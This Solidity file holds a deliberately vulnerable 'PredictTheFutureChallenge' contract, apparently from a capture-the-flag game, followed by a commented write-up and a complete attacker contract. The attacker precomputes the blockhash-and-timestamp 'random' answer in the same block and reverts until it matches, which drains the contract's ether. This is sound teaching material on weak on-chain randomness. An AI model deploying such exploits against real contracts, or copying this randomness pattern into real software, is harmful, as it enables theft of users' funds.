pragma solidity ^0.4.21;

contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    function PredictTheFutureChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

/*
The trick here is to create a smart contract that have 2 functions:

1. The first function have to call the function lockInGuess with one number between 0 and 9(example 3).
2. The second function have to call the function settle only when the calculate is 3:

uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

In both smart contracts the variables are the same becouse are in the same block. In case that the result wasn't 3 revert. Only loss gas until get the result.

3. One time that you have succecss call the function witdrall to get your ether

The script is:

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

interface PredictTheFutureChallenge {
    function lockInGuess(uint8 n) external payable;
    function settle() external;
}

contract Script {
    address payable owner;
    uint8 public guest;
    PredictTheFutureChallenge challenge;

    constructor(address challengeAddress) {
        owner = payable(msg.sender);
        challenge = PredictTheFutureChallenge(challengeAddress);
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    receive() external payable {}

    function lockInGuess() payable external {
        require(msg.value == 1 ether);
        challenge.lockInGuess{value:msg.value}(3);
    }

    function settle() external {
        uint8 answer = uint8(uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        guest = answer % 10;
        require(guest == 3, "wtf");
        challenge.settle();
    }

    function withdraw() external onlyOwner payable {
        owner.transfer(address(this).balance);
    }
}
*/